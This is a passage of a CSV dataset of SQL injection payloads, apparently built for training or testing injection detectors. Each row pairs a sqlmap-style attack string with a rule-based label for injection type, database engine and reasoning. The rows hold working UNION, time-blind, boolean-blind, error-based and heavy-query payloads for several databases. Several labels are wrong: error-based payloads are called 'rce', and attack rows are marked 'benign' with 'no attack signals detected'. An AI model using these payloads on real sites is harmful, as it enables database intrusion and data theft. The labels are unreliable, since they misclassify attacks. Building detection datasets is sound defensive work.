row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4500,"-4527' union all select 7115,7115#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4501,"-3672"" ) ) union all select 6093#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4502,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'zeum' = 'zeum",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
4503,"select count ( * ) from generate_series ( 1,5000000 ) and ( ""jzmg"" = ""jzmg",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
4504,"select count ( * ) from generate_series ( 1,5000000 )",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
4505,"1' ) ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4506,1%' ) ) ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4507,1' where 4473 = 4473 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4508,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 4959 = 4959",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4509,"1"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""azpb"" = ""azpb",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
4510,"1%' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and '%' = '",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
4511,1%' ) ) ) or sleep ( 5 ) and ( ( ( '%' = ',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4512,1'|| ( select 'xtcb' where 5240 = 5240,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4513,"1' ) ) as popm where 6594 = 6594 union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4514,( select ( case when ( 7018 = 7018 ) then 7018 else 7018* ( select 7018 from master..sysdatabases ) end ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4515,-7770' where 6503 = 6503 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,6503 = 6503 or detected — boolean_blind injection (priority 8) on generic,rule-based
4516,"1"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""nobt"" = ""nobt",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4517,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4518,"1, ( select ( case when ( 5777 = 5777 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4519,"1"" ) where 5065 = 5065",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4520,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kbkz' = 'kbkz",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4521,-2806' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'rxzr' = 'rxzr,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4522,"-9854%"" ) ) ) or 6455 = 3652",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4523,"1' where 4272 = 4272 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4524,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4525,1 ) as tykp where 6851 = 6851,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4526,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'dkra' like 'dkra",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
4527,-3186 or 3867 = 9405,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4528,"1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""quni"" = ""quni",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
